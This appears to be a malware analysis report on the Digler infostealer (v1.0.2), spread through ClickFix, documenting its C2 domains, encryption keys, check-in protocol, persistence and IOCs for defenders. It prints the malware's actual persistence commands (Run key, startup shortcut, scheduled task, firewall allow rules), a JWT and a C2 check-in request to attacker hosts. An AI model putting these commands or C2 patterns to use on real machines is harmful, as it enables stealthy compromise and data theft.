# ClickFix / Digler Infostealer Analysis

**Campaign Name:** Digler  
**Campaign ID:** F867700a  
**Threat Actor:** Unknown  
**Version Analyzed:** Digler 1.0.2  
**VirusTotal:** [f8fef470326c2834b213fe47a5024edbb101dc966395622a6617f686d330fb52](https://www.virustotal.com/gui/file/f8fef470326c2834b213fe47a5024edbb101dc966395622a6617f686d330fb52/detection)

**Source Thread (v1.0.1):**  
https://www.reddit.com/r/cybersecurity_help/comments/1r4ae25/what_does_this_clickfixlumma_infostealer_ps/

---

## Table of Contents

- [Version Comparison](#version-comparison)
- [Execution Flow](#execution-flow)
- [Argument-Based Execution](#argument-based-execution)
- [C2 Infrastructure](#c2-infrastructure)
- [Encryption](#encryption)
- [License Verification](#license-verification)
- [Persistence Mechanisms](#persistence-mechanisms)
- [Installation](#installation)
- [Check-in & Tasking](#check-in--tasking)
- [New Capabilities (Not Yet Active)](#new-capabilities-not-yet-active)
- [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
- [MITRE ATT&CK Mapping](#mitre-attck-mapping)

---

## Version Comparison

| Feature | v1.0.1 | v1.0.2 |
|---------|--------|--------|
| Argument-based execution (`RunFromArgs`) | ❌ | ✅ |
| C2 via Cloudflare Workers | Generic domains | Trusted-looking domains |
| Offline license check | ✅ | ✅ (MD5 of date) |
| Remote license check | ✅ | ✅ (kept) |
| Screenshot capability | ✅ | ✅ (implemented, not active) |
| Download observer | ✅ | ✅ (implemented, not active) |
| Task types | ps1, exe, cmd, bat | ps1, exe, cmd, bat (unchanged) |
| Uninstall / cleanup routine | Basic | Extended (removes all v1.0.0/v1.0.1 traces) |

---

## Execution Flow

The binary supports multiple execution modes, selected via command-line arguments:

```
checkbinary.exe [--install | --uninstall | --user-agent | --user-proxy | --user-standalone | --service-supervisor]
```

> **New in v1.0.2:** The function `Microsoft_Installer_Agent_V3_RunFromArgs` handles argument dispatch.  
> This was absent in v1.0.1, which ran a single execution path.  
> Digler v1.0.0 also uses this function — v1.0.1 is the outlier.

<img width="1304" height="361" alt="RunFromArgs dispatch" src="https://github.com/user-attachments/assets/4853b7fd-50d7-4410-b4a1-e314573eb1a0" />

After initial install, the binary restarts itself with `--user-agent`.

---

## Argument-Based Execution

| Argument | Behavior |
|----------|----------|
| `--install` | Full installation routine |
| `--uninstall` | Removes all persistence, registry keys, scheduled tasks, firewall rules |
| `--user-agent` | Main agent loop (C2 check-in, task retrieval) |
| `--user-proxy` | Runs as user-side proxy handler |
| `--user-standalone` | Standalone mode (no service dependency) |
| `--service-supervisor` | Watchdog: restarts agent if killed |

---

## C2 Infrastructure

### New in v1.0.2 — Trusted-Looking Cloudflare Worker Domains

<img width="1119" height="239" alt="New C2 domains" src="https://github.com/user-attachments/assets/1fc66c33-2178-45fb-b31c-22a863bf2c06" />

The threat actor moved from randomly-named workers to domains mimicking legitimate cloud services:

```
https://us5-east[.]cloud-updater[.]workers.dev/
https://stat[.]web-analytics[.]workers[.]dev/
https://download[.]stable-releases[.]workers[.]dev/
```

<img width="962" height="101" alt="Domain masquerading" src="https://github.com/user-attachments/assets/f5bb5879-b20d-4725-ae28-f00288ed2a1c" />

> The binary tries all three in sequence. If all fail, it silently exits.

### v1.0.0 C2 (for reference)
```
http://91[.]210[.]165[.]153:8080
```

### v1.0.1 C2 (JavaScript RAT, for reference)
```
http://stat[.]greenslighttcodetdat.net
http://aplalink[.]com
http://altsocks101[.]com
http://altsocks2[.]com
```

---

## Encryption

The encryption scheme is **unchanged** across all versions:

```
Hex string → AES-GCM decryption → Cleartext
```

**Format:** `[nonce 12 bytes][ciphertext][GCM tag 16 bytes]`

### AES-256 Keys

**Digler v1.0.0**
```
Qwords (LE): 0xD2D785F280FFD1C9, 0xC5046532575BB92E, 0x882497BD982E5CAC, 0xD007B846CC6B63DD
Key (hex):   c9d1ff80f285d7d22eb95b57326504c5ac5c2e98bd972488dd636bcc46b807d0
```

**Digler v1.0.2**
```
Qwords (LE): 0x46C24C5B91BFD3E0, 0x8B834738AF7613B2, 0x0EADC20964B21CB1E, 0x0C7577F6EE7DFDC63
Key (hex):   e0d3bf915b4cc246b213768af38388b21ecb214b9620c2ad63c6fd7df67f57c7
```

### Decrypted Strings (v1.0.2)

| # | Plaintext |
|---|-----------|
| 1 | `windows_service` |
| 2 | (long config blob) |
| 3–9 | C2 endpoints, registry paths, task identifiers |

### Decrypted Strings (v1.0.0)

| # | Plaintext |
|---|-----------|
| 1 | JWT Bearer token |
| 2 | `http://91[.]210[.]165[.]153:8080` |
| 3 | `5` |
| 4 | `1002` |

---

## License Verification

### Remote Check (all versions)

The binary contacts the C2 to validate a license key. If the returned value equals `"none"`, the program exits.

### New in v1.0.2 — Offline Check

<img width="713" height="239" alt="Offline license check" src="https://github.com/user-attachments/assets/4cda4c6a-f54f-4635-b1bd-0f5657b06c63" />

An offline fallback using `license_check` (previously only `remote_check`).  
The offline key is derived from the **MD5 hash of the current date**.

<img width="646" height="163" alt="License validation flow" src="https://github.com/user-attachments/assets/3296284b-1c6a-495d-b30e-ae08d4d1efbc" />

> The validation logic has been consistent since v1.0.0 — v1.0.2 adds the offline path without changing the core scheme.

### Data Collected During License Check

| Field | Source |
|-------|--------|
| `os_hostname` | `GetComputerNameEx` |
| `is_admin` | `CheckTokenMembership` |
| `proxy_running` | `PickSessionId` → `DialUserSessionPipe` |
| `os_name` | Registry: `SOFTWARE\Microsoft\Windows NT\CurrentVersion` |
| `private_ip` | `Net_Interfaceaddrs` |
| `public_ip` | `https://ifconfig.me/ip` or `https://checkip.amazonaws.com` |
| `cpu_name` | Registry: `HARDWARE\DESCRIPTION\System\CentralProcessor\0` |
| `total_memory_mb` | `GlobalMemoryStatusEx` |
| `timezone` | `time.Now()` |
| `domain_name` | `GetComputerNameEx` |
| `username` | `GetUserNameEx` |

---

## Persistence Mechanisms

Persistence varies depending on the argument used to launch the binary.

### Cleanup — Removes All Previous Traces First

```powershell
netsh advfirewall firewall delete rule "name=OnCall Service"
reg delete "Software\Microsoft\Windows\CurrentVersion\Uninstall\OnCall" /f
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\OnCall.lnk"
reg delete "Software\Microsoft\Windows\CurrentVersion\Run\OnCall" /f
schtasks /Delete /TN OnCall_helper_PeriodicRestart /F
powershell -command "Get-CimInstance Win32_Process | Where-Object { $_.ExecutablePath -like '%s' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }"
```

### Installation Path

<img width="566" height="131" alt="Random name copy" src="https://github.com/user-attachments/assets/1524b5fd-07a0-4a12-91c9-f337addd3309" />

```
C:\Users\%USERNAME%\AppData\Local\OnCall\<random_name>.exe
```

### Registry Keys

**Uninstall Entry:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall\OnCall
  DisplayName      = "OnCall"
  DisplayVersion   = <version>
  DisplayIcon      = <install_path>
  InstallLocation  = C:\Users\%USERNAME%\AppData\Local\OnCall\<random_name>
  Publisher        = "OnCall"
  UninstallString  = "<path> --uninstall"
  EstimatedSize    = <size>
  VersionMajor     = <major>
  VersionMinor     = <minor>
```

**System Policy:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System
  SoftwareSASGeneration = <value>
```

**Run Key:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OnCall
  Value = "<path> --user-agent"
```

### Startup LNK

```powershell
$shell = New-Object -ComObject WScript.Shell
$shortcut = $shell.CreateShortcut("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OnCall.lnk")
$shortcut.TargetPath = "<install_path>"
$shortcut.Arguments = "--user-agent"
$shortcut.WorkingDirectory = "<install_dir>"
$shortcut.IconLocation = "<install_path>"
$shortcut.Save()
```

### Scheduled Task

```
schtasks /create /TN OnCall-Helper-PeriodicRestart /SC MINUTE /MO 30 /TR "<path> --user-agent" /RL LIMITED /F
```

### Firewall Rules

```
netsh advfirewall firewall add rule name="OnCall Service" dir=in  action=allow program="<path>" enable=yes
netsh advfirewall firewall add rule name="OnCall Service" dir=out action=allow program="<path>" enable=yes
```

---

## Check-in & Tasking

### Registration Endpoint

```
POST https://us5-east[.]cloud-updater[.]workers[.]dev/api/agent/check-in
     (or any of the 3 worker domains)
```

**Headers:**
```
Content-Type: application/json
Authorization: Bearer <JWT>
```

**Body (real sample):**
```json
{
  "machine_id": "f8a884df",
  "hostname": "DESKTOP",
  "project_name": "digler",
  "build_id": "f867700a",
  "version": "1.0.2",
  "os": "Windows 10",
  "private_ip": "169.254.180.80",
  "public_ip": "169.254.180.80",
  "cpu": "Intel(R) Core(TM) i9",
  "gpu": "",
  "ram_mb": 65000,
  "timezone": "CET",
  "username": "DESKTOP\\FlameVM",
  "is_admin": false,
  "user_session_proxy_running": false,
  "is_preinstall": false
}
```

### JWT Bearer Token (v1.0.2)

```
eyJhbGciOiJFZERTQSIsInR5cCI6IkpXVCJ9.eyJidWlsZF9pZCI6ImY4Njc3MDBhIiwiZXhwIjoxODMxMjQ2NjY3LCJpYXQiOjE3NjgxNzQ2NjcsImp0aSI6IjJlYTMxOWMyLWFjZjgtNDQ3Zi1hZDI0LWE5MjVkMzJlYzMyZSIsInByb2plY3RfbmFtZSI6ImRpZ2xlciIsInN1YiI6ImY4Njc3MDBhIiwidGVuYW50X3Byb2plY3RfaWQiOiIzN2tYREFoaHJQNjhRNlZnU2dxcm9nMEZPZkwiLCJ2ZXJzaW9uIjoiMS4wLjIifQ.Q8yz_ykudbSzJoL3vUtpPTTRGcpg1Lp3LQPAZqinXhAnAYSTkOGji-oOX-WdRSu-HetWuFPHUjYBYPi55lLVAA
```

**JWT Payload:**

| Field | Value |
|-------|-------|
| `alg` | EdDSA (Ed25519) |
| `build_id` | `f867700a` |
| `sub` | `f867700a` |
| `project_name` | `digler` |
| `version` | `1.0.2` |
| `tenant_project_id` | `37kXDAhhrP68Q6VgSgqrog0FOfL` |
| `jti` | `2ea319c2-acf8-447f-ad24-a925d32ec32e` |
| `iat` | 1768174667 → 2026-01-11 |
| `exp` | 1831246667 → 2028-01-11 |

### Task Retrieval

```
GET https://us5-east[.]cloud-updater[.]workers[.]dev/api/agent/check-in
```

**Identification data sent:**

| Field | Value |
|-------|-------|
| `build_id` | `f867700a` (8 bytes) |
| `version` | `1.0.2` (5 bytes) |
| `project_name` | `Digler` (6 bytes) |
| `is_service` | `0` |

**Register (encrypted):** `abbb19a57ba4b66c7c917063b8d66421`

**Supported task types:** `ps1`, `exe`, `cmd`, `bat`

---

## New Capabilities (Not Yet Active)

| Capability | Status |
|------------|--------|
| `Screenshot` | Implemented — not triggered |
| `Set_DownloadObserver` | Implemented — not triggered |

---

## Indicators of Compromise (IOCs)

### File System

| Path | Description |
|------|-------------|
| `C:\Users\%USERNAME%\AppData\Local\OnCall\<random>.exe` | Main binary (random name) |
| `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\OnCall.lnk` | Startup LNK persistence |

### Registry Keys

| Key | Value | Data |
|-----|-------|------|
| `HKCU\...\Uninstall\OnCall` | `DisplayName` | `OnCall` |
| `HKCU\...\Uninstall\OnCall` | `UninstallString` | `<path> --uninstall` |
| `HKCU\...\Policies\System` | `SoftwareSASGeneration` | `<value>` |
| `HKCU\...\Run` | `OnCall` | `<path> --user-agent` |

### Network Indicators

**Active C2 Domains (v1.0.2):**
```
https://us5-east[.]cloud-updater[.]workers[.]dev/
https://stat[.]web-analytics[.]workers[.]dev/
https://download[.]stable-releases[.]workers[.]dev/
```

**Legacy C2 (v1.0.0):**
```
http://91[.]210[.]165[.]153:8080
```

**Legacy C2 JavaScript RAT (v1.0.1):**
```
http://stat[.]greenslighttcodetdat[.]net
http://aplalink[.]com
http://altsocks101[.]com
http://altsocks2[.]com
```

**Public IP check:**
```
https://ifconfig.me/ip
https://checkip.amazonaws.com
```

**Payload hosting (v1.0.1):**
```
storage[.]googleapis[.]com/release-v5-dl/*
```

### Scheduled Tasks

```
OnCall-Helper-PeriodicRestart   (every 30 minutes)
```

### Firewall Rules

```
Rule name: "OnCall Service"  dir=in   action=allow
Rule name: "OnCall Service"  dir=out  action=allow
```

### File Hashes

| Hash | File | Version |
|------|------|---------|
| `AD4DDF9C289F28DA9665BE0CA4742710` | checkbinary.exe | v1.0.2 |
| `DAF1CB75EDD8E045F5F6034FC76C097F` | checkbinary.exe | v1.0.1 |
| `14148DB21D3F6AC4C1DAA8D9500DEC26` | Fake OpenVPN installer | v1.0.1 |

---

## MITRE ATT&CK Mapping

| Tactic | ID | Technique | Implementation |
|--------|----|-----------|----------------|
| Initial Access | T1566.001 | Phishing: Spearphishing Attachment | ClickFix social engineering via malicious PowerShell |
| Execution | T1059.001 | PowerShell | PowerShell dropper executes payload |
| Execution | T1059.007 | JavaScript | Deno runtime executes JavaScript RAT (v1.0.1) |
| Persistence | T1547.001 | Registry Run Keys / Startup Folder | LNK in Startup + Run key |
| Persistence | T1053.005 | Scheduled Task | `OnCall-Helper-PeriodicRestart` every 30 min |
| Persistence | T1543.003 | Windows Service | `OnCall` service installation |
| Defense Evasion | T1027 | Obfuscated Files or Information | Multi-layer Base64 + reversal obfuscation |
| Defense Evasion | T1140 | Deobfuscate/Decode Files or Information | Base64 → AES-GCM decryption at runtime |
| Defense Evasion | T1562.004 | Disable or Modify System Firewall | Firewall rules added for inbound/outbound traffic |
| Defense Evasion | T1112 | Modify Registry | Registry keys for persistence and configuration |
| Defense Evasion | T1036 | Masquerading | Random binary name; trusted-looking C2 domains |
| Defense Evasion | T1070 | Indicator Removal | Cleans up all previous version traces on install |
| Discovery | T1082 | System Information Discovery | OS, CPU, RAM, timezone, domain, username |
| Discovery | T1016 | System Network Configuration Discovery | Private/public IP, proxy detection |
| Discovery | T1033 | System Owner/User Discovery | `GetUserNameEx`, `CheckTokenMembership` |
| Command and Control | T1071.001 | Web Protocols | HTTP/HTTPS C2 communication |
| Command and Control | T1102 | Web Service | Cloudflare Workers as C2 proxy layer |
| Command and Control | T1573 | Encrypted Channel | AES-GCM for all C2 communications |
| Command and Control | T1568 | Dynamic Resolution | 3 fallback C2 domains tried in sequence |

---

*Analysis performed on FLARE-VM — February 2026*
